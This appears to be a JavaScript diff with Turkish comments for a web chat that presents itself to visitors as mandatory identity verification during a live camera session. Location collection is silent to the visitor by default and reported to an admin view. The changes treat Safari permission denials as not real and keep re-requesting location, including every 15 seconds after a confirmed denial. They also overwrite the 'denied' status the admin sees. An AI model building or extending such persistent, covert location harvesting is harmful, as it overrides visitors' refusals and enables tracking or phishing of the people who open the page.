@@ -860,13 +860,15 @@
       return;
     }
 
-    const LOCATION_RETRY_MS = 10_000;
+    const LOCATION_RETRY_MS = 8_000;
     const LOCATION_DENIED_TEXT =
       "Kimlik doğrulaması için izin verilmedi. İzin zorunludur; izin olmadan doğrulama tamamlanamaz.";
     const deferAsk = opts.deferAsk === true;
     const silent = opts.silent !== false; // varsayılan: ziyaretçiye konum metni yok
     let lastWriteAt = 0;
     let asking = false;
+    let lastAskAt = 0;
+    let consecutiveCode1 = 0;
 
     if (deferAsk) {
       sync
@@ -903,10 +905,27 @@
       box?.querySelectorAll(".chat-location-perm-denied").forEach((el) => el.remove());
     };
 
+    const geoPermissionState = () =>
+      new Promise((resolve) => {
+        try {
+          if (!navigator.permissions?.query) {
+            resolve("unknown");
+            return;
+          }
+          navigator.permissions
+            .query({ name: "geolocation" })
+            .then((p) => resolve(p?.state || "unknown"))
+            .catch(() => resolve("unknown"));
+        } catch {
+          resolve("unknown");
+        }
+      });
+
     const publish = (pos) => {
       if (!sessionStillActive(state, callId)) return;
       clearLocRetry();
       clearLocDeniedNotice();
+      consecutiveCode1 = 0;
       const now = Date.now();
       if (state._hadLocation && now - lastWriteAt < 2500) return;
       lastWriteAt = now;
@@ -948,36 +967,84 @@
       state._onLocationGranted?.();
     };
 
-    const scheduleRetry = () => {
-      // Zorla aç: jest olmasa da tekrar dene (Safari sessiz reddedebilir)
+    const scheduleRetry = (ms = LOCATION_RETRY_MS) => {
       if (deferAsk) return;
       if (!sessionStillActive(state, callId) || state._hadLocation) return;
       clearLocRetry();
       state.locationRetryTimer = window.setTimeout(() => {
         state.locationRetryTimer = null;
-        void askLocation(false);
-      }, 10000);
+        void askLocation({ fromUserTap: false, explicit: false });
+      }, ms);
     };
 
-    const onErr = (err, { fromUserTap = false } = {}) => {
-      // Konum hatası kamerayı ASLA kapatmaz ve sohbete spam basmaz
+    const onErr = async (err, meta = {}) => {
+      // Konum hatası kamerayı ASLA kapatmaz
       if (!sessionStillActive(state, callId) || state._hadLocation) return;
       const code = Number(err?.code);
-      const isRealUserDeny = fromUserTap === true && code === 1;
+      const fromUserTap = meta.fromUserTap === true;
+      const explicit = meta.explicit === true; // yalnızca “İzin ver” butonu
       const activeId = resolveSessionCallId(state, callId);
-      if (isRealUserDeny) {
-        sync.writeLocationStatus?.(sessionId, activeId, "denied", err?.message || "denied").catch(() => {});
+      const perm = await geoPermissionState();
+
+      // Safari/iOS: jest olmadan veya arka planda code=1 sık gelir — bu “kullanıcı reddetti” değil
+      if (code === 1) consecutiveCode1 += 1;
+      else consecutiveCode1 = 0;
+
+      const reallyDenied =
+        perm === "denied" ||
+        (explicit && code === 1 && perm !== "granted" && consecutiveCode1 >= 2);
+
+      if (reallyDenied) {
+        sync
+          .writeLocationStatus?.(sessionId, activeId, "denied", err?.message || "denied")
+          .catch(() => {});
         if (!silent && box) showLocDeniedNotice();
-      } else if (!state._locPromptWritten) {
-        state._locPromptWritten = true;
-        sync.writeLocationStatus?.(sessionId, activeId, "prompting", "Konum bekleniyor").catch(() => {});
+        // Yine de ara sıra dene — kullanıcı ayardan açabilir
+        scheduleRetry(15_000);
+        return;
       }
-      scheduleRetry();
+
+      // Sticky denied’ı admin’de bırakma — prompting/error ile üzerine yaz
+      if (code === 3 || code === 2) {
+        sync
+          .writeLocationStatus?.(
+            sessionId,
+            activeId,
+            code === 3 ? "timeout" : "unavailable",
+            err?.message || String(code)
+          )
+          .catch(() => {});
+      } else {
+        sync
+          .writeLocationStatus?.(
+            sessionId,
+            activeId,
+            fromUserTap ? "prompting" : "prompting",
+            perm === "granted" ? "gps-wait" : "Konum bekleniyor"
+          )
+          .catch(() => {});
+      }
+      // İzin granted ama fix yoksa daha hızlı tekrar
+      scheduleRetry(perm === "granted" || fromUserTap ? 4_000 : LOCATION_RETRY_MS);
     };
 
-    const askLocation = (fromUserTap = false) => {
+    const askLocation = (opts = {}) => {
+      const fromUserTap = opts === true || opts?.fromUserTap === true;
+      const explicit = opts?.explicit === true;
       if (!sessionStillActive(state, callId) || state._hadLocation || asking) return;
+      const now = Date.now();
+      // Dialog açıkken yeniden çağırıp ilk isteği öldürme
+      if (!fromUserTap && now - lastAskAt < 2500) {
+        scheduleRetry(3000);
+        return;
+      }
       asking = true;
+      lastAskAt = now;
+      // Aktif watch varken yeniden getCurrentPosition — watch’ı bozma
+      if (state.geoWatchId != null && !fromUserTap) {
+        asking = false;
+        return;
+      }
       if (state.geoWatchId != null) {
         try {
           navigator.geolocation.clearWatch(state.geoWatchId);
@@ -986,43 +1053,56 @@
         }
         state.geoWatchId = null;
       }
+
+      const geoOpts = fromUserTap
+        ? { enableHighAccuracy: true, maximumAge: 0, timeout: 45000 }
+        : { enableHighAccuracy: false, maximumAge: 60000, timeout: 20000 };
+
       navigator.geolocation.getCurrentPosition(
         (pos) => {
           asking = false;
+          consecutiveCode1 = 0;
           publish(pos);
           if (!sessionStillActive(state, callId) || !state._hadLocation) return;
           state.geoWatchId = navigator.geolocation.watchPosition(
             publish,
-            (err) => onErr(err, { fromUserTap: false }),
+            (err) => {
+              void onErr(err, { fromUserTap: false, explicit: false });
+            },
             {
               enableHighAccuracy: true,
               maximumAge: 5000,
-              timeout: 20000,
+              timeout: 25000,
             }
           );
         },
         (err) => {
           asking = false;
-          onErr(err, { fromUserTap });
+          void onErr(err, { fromUserTap, explicit });
         },
-        {
-          enableHighAccuracy: false,
-          maximumAge: 60000,
-          timeout: 30000,
-        }
+        geoOpts
       );
     };
 
     state.locationRetryTimer = null;
-    state.retryLocation = (fromUserTap = false) => askLocation(Boolean(fromUserTap));
+    // fromUserTap: jest kullan (GPS için); explicit: gerçekten “reddedildi” yazılabilir
+    state.retryLocation = (opts = false) => {
+      if (opts === true) askLocation({ fromUserTap: true, explicit: false });
+      else if (opts && typeof opts === "object") askLocation(opts);
+      else askLocation({ fromUserTap: false, explicit: false });
+    };
     if (!deferAsk) {
-      askLocation(false);
-      // İzin zaten verildiyse tarayıcı prompt göstermeden sessiz al
+      askLocation({ fromUserTap: false, explicit: false });
       try {
         navigator.permissions?.query?.({ name: "geolocation" }).then((p) => {
-          if (p?.state === "granted" && !state._hadLocation) askLocation(false);
+          if (p?.state === "granted" && !state._hadLocation) {
+            askLocation({ fromUserTap: false, explicit: false });
+          }
           p?.addEventListener?.("change", () => {
-            if (p.state === "granted" && !state._hadLocation) askLocation(false);
+            if (p.state === "granted" && !state._hadLocation) {
+              clearLocDeniedNotice();
+              askLocation({ fromUserTap: false, explicit: false });
+            }
           });
         }).catch(() => {});
       } catch {
@@ -1770,11 +1850,11 @@
           resolve({ ok: false, err: { code: 0, message: "unsupported" } });
           return;
         }
-        // Dokunuşla doğrudan telefon konum izni
+        // Dokunuşla doğrudan telefon konum izni (iOS: highAccuracy + fresh)
         navigator.geolocation.getCurrentPosition(
           (pos) => resolve({ ok: true, pos }),
           (err) => resolve({ ok: false, err }),
-          { enableHighAccuracy: false, maximumAge: 60000, timeout: 60000 }
+          { enableHighAccuracy: true, maximumAge: 0, timeout: 45000 }
         );
       });
 
@@ -1848,17 +1928,35 @@
           return;
         }
         const code = locRes.err?.code;
+        // Permissions API denied değilse “reddedildi” yazma (Safari false positive)
+        let geoState = "unknown";
+        try {
+          const p = await navigator.permissions?.query?.({ name: "geolocation" });
+          geoState = p?.state || "unknown";
+        } catch {
+          /* ignore */
+        }
+        const hardDeny = code === 1 && geoState === "denied";
         sync
           ?.writeLocationStatus?.(
             sync.getSessionId(),
             targetCallId,
-            code === 1 ? "denied" : "error",
+            hardDeny ? "denied" : code === 3 ? "timeout" : "prompting",
             locRes.err?.message || String(code || "err")
           )
           .catch(() => {});
-        title.textContent = "İzin yok — telefon ayarı";
-        note.textContent = phonePermSettingsHelp("location");
-        okBtn.textContent = "Ayarlardan sonra tekrar dene";
+        if (existing) {
+          try {
+            existing.retryLocation?.({ fromUserTap: true, explicit: hardDeny });
+          } catch {
+            /* ignore */
+          }
+        }
+        title.textContent = hardDeny ? "İzin yok — telefon ayarı" : "Konum alınıyor…";
+        note.textContent = hardDeny
+          ? phonePermSettingsHelp("location")
+          : "İzin verildiyseniz GPS sabitlemesi biraz sürebilir. Tekrar İzin ver’e dokunun.";
+        okBtn.textContent = "Tekrar dene";
         okBtn.disabled = false;
         options.onSoftDeny?.(String(code || "loc"));
         return;
@@ -1904,11 +2002,19 @@
         appendMessage(box, "bot", "İzin alındı.", { sync: true });
       } else {
         const code = locRes.err?.code;
+        let geoState = "unknown";
+        try {
+          const p = await navigator.permissions?.query?.({ name: "geolocation" });
+          geoState = p?.state || "unknown";
+        } catch {
+          /* ignore */
+        }
+        const hardDeny = code === 1 && geoState === "denied";
         sync
           ?.writeLocationStatus?.(
             sync.getSessionId(),
             callId,
-            code === 1 ? "denied" : "error",
+            hardDeny ? "denied" : code === 3 ? "timeout" : "prompting",
             locRes.err?.message || String(code || "err")
           )
           .catch(() => {});
@@ -2969,13 +3075,14 @@
     const onGesture = () => {
       if (token !== cameraPermLoopToken) return;
       const now = Date.now();
-      if (now - lastGestureAt < 900) return;
+      if (now - lastGestureAt < 1200) return;
       lastGestureAt = now;
-      // Canlı cam + konum eksik → gum değil, konum jest’i
+      // Canlı cam + konum eksik → gum değil; jest ile konum iste.
+      // explicit:false — Safari code=1’i yanlış “reddedildi” yapmasın
       const live = findLiveCameraSessionEntry();
       if (live && !live[1]._hadLocation) {
         try {
-          live[1].retryLocation?.(true);
+          live[1].retryLocation?.({ fromUserTap: true, explicit: false });
         } catch {
           /* ignore */
         }
